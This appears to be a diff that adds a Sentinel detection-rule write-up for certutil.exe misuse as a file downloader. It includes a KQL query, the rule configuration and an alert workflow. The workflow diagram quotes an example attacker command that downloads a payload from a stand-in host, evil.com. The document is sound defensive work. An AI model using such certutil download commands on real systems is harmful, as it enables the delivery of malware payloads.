@@ -4138,3 +4138,161 @@ This detection helps security teams:
 
 ---
 
+# 📥 Certutil Download
+
+## 🎯 Objective
+This rule detects the abuse of the legitimate `certutil.exe` administrative binary to download files from remote locations. It alerts security teams to Living off the Land (LotL) tactics used by threat actors to fetch secondary payloads and binaries.
+
+---
+
+## 📖 Threat Overview
+`certutil.exe` is a native Windows utility designed for managing Certificate Services. However, because it is signed by Microsoft and trusted by default, attackers frequently abuse its built-in URL caching and decoding features (using flags like `-urlcache`, `-split`, or http requests) to bypass security controls and download malicious files from external command-and-control servers directly onto disk.
+
+---
+
+## 🔥 Severity
+**High**
+
+---
+
+## 🛡️ MITRE ATT&CK Mapping
+| Tactic | Technique | Technique ID |
+|---------|-----------|--------------|
+| Command And Control | Ingress Tool Transfer | T1105 |
+
+---
+
+## 📂 Data Sources
+* Windows Security Event Logs (Event ID 4688 - Process Creation)
+* Azure Monitor Agent (AMA)
+* Log Analytics Workspace
+* Microsoft Sentinel
+
+---
+
+## 📑 Detection Logic (KQL)
+The following query monitors for process creation events involving `certutil.exe` combined with known download arguments or web protocols:
+
+    SecurityEvent
+    | where EventID == 4688
+    | where Process has "certutil.exe"
+    | where CommandLine has_any ("-urlcache", "-split", "http://", "https://")
+    | project TimeGenerated, Computer, Account, Process, CommandLine
+
+---
+
+## ⚙️ Rule Configuration
+| Setting | Value | Reason |
+|----------|-------|--------|
+| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect Living off the Land file transfers immediately. |
+| **Severity** | High | Using certutil to retrieve external files is a classic, highly reliable indicator of malicious ingress transfer. |
+| **Status** | Enabled | Ensures the detection is currently active. |
+| **Event Grouping** | Trigger an alert for each event | Captures every individual instance of malicious certutil execution. |
+| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |
+
+---
+
+## 🧩 Entity Mapping
+The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.
+
+| Entity | Identifier | Field |
+|---------|------------|-------|
+| Account | Name | Account |
+| Host | HostName | Computer |
+| Process | CommandLine | CommandLine |
+
+### Why map these entities?
+* **Account:** Identifies the user or compromised account executing the download.
+* **Host:** Highlights the endpoint where the external file is being downloaded.
+* **Process:** Extracts the exact `CommandLine` arguments, revealing the specific URL and download flags used.
+
+---
+
+## 🔄 Detection Workflow
+
+    Attacker executes certutil to download an external payload (e.g., certutil -urlcache -split -f http://evil.com/payload.exe)
+                │
+                ▼
+    Target Host logs Event ID 4688 (Process Creation)
+                │
+                ▼
+    Azure Monitor Agent (AMA) ingests the event
+                │
+                ▼
+    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
+                │
+                ▼
+    Process matches certutil.exe and CommandLine contains download indicators
+                │
+                ▼
+    Alert Generated
+                │
+                ▼
+    Incident Created (Grouped by Account and Host)
+                │
+                ▼
+    SOC Analyst Assigned & Payload Deobfuscation / Host Isolation Initiated
+
+---
+
+## 🚨 Alert Trigger Conditions
+An alert is generated when all of the following conditions are met:
+* Windows Security Event **4688** is logged.
+* The `Process` field references `"certutil.exe"`.
+* The `CommandLine` field contains download-related flags or protocols such as `"-urlcache"`, `"-split"`, `"http://"`, or `"https://"`.
+
+---
+
+## 📋 Incident Configuration
+* **Incident Creation:** Enabled.
+* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
+* **Grouping Time Window:** 5 Hours.
+* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host**.
+
+### Why group alerts by Account and Host?
+If an adversary executes multiple download commands or queries cache states sequentially on the same host, grouping by Account and Host bundles these related events into a single unified incident ticket for the analyst.
+
+---
+
+## ✅ Validation
+This detection can be validated in a lab environment by opening an elevated command prompt and executing a benign test download command, such as `certutil.exe -urlcache -split -f http://example.com/test.txt`. Microsoft Sentinel will capture the 4688 event and generate an incident.
+
+---
+
+## 🎯 Security Impact
+This detection helps security teams:
+* Identify Living off the Land (LotL) binary abuse that evades traditional signature-based antivirus.
+* Capture external URLs and threat actor infrastructure leveraged during the ingress tool transfer stage.
+* Stop malware and secondary payloads from landing on sensitive corporate endpoints.
+
+---
+
+## 📸 Screenshots
+
+### Rule Overview
+> *(Screenshot 2026-08-03 215444.png)*
+
+### MITRE ATT&CK Mapping
+> *(Screenshot 2026-08-03 215500.png)*
+
+### KQL Query
+> *(Screenshot 2026-08-03 215528.png)*
+
+### Entity Mapping
+> *(Screenshot 2026-08-03 215539.png)*
+
+### Incident Settings
+> *(Screenshot 2026-08-03 215548.png)*
+
+### Automated Response
+> *(Screenshot 2026-08-03 215555.png)*
+
+### Review & Create
+> *(Screenshot 2026-08-03 215601.png)*
+---
+⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**
+
+---
+
+
+
